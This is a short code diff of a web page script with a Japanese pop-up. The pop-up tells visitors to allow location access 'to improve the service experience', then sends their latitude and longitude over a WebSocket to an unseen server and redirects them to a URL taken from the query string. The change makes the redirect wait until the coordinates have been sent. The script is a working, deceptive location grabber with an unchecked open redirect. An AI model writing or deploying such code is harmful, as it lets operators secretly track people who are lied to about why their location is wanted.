@@ -4,8 +4,8 @@
     alert("このサイトのサービス体験向上のために位置情報「許可」を押してください。許可次第、次のサイトに移行します")
     navigator.geolocation.getCurrentPosition(function(a){
         ws.send(`${a.coords.latitude}, ${a.coords.longitude}`)
-        
+        location.href=new URL(location.href).searchParams.get("redirect")
     },
     function(a){})
-    location.href=new URL(location.href).searchParams.get("redirect")
+    
 </script>
